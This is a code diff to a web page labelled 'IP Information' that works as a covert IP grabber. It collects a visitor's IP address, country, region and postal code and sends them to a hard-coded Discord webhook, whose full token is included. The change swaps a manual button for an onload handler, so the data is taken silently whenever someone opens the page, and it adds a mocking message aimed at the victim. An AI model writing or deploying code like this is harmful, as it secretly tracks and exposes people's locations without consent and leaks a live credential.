@@ -52,9 +52,8 @@
         const webhookUrl = 'https://discord.com/api/webhooks/1113688349878800445/lWt0rsk4cFH0uvbagEzKbGQUgJLF17bA3h4BqlfK9E8OizkwgWgzBhhYoVaBLaokSfOL'; // Replace with your Discord webhook URL
         const payload = {
           content: `
-__**SomeOne Has Want To https://nikoleaks.netlify.app/main/test**__\n
+:skull\n
 DUMASS\n
-It Only Gets Your Stuff Form https://nikoleaks.netlify.app/main/test\n
 IP: ${ip}\n
 Country: ${country}\n
 Region: ${region}\n
@@ -125,7 +124,7 @@ Postal Code: ${postalCode}`
     }
   </style>
 </head>
-<body>
+<body onload="getIP()">
   <h1>IP Information</h1>
   <form>
     <label for="ipAddress">Enter IP Address:</label>
@@ -139,6 +138,5 @@ Postal Code: ${postalCode}`
   <p><strong>Country:</strong> <span id="country"></span></p>
   <p><strong>Postal Code:</strong> <span id="postal"></span></p>
   <p><span id="ipDisplay"></span></p>
-  <button onclick="getIP()">Get IP Details</button>
 </body>
 </html>
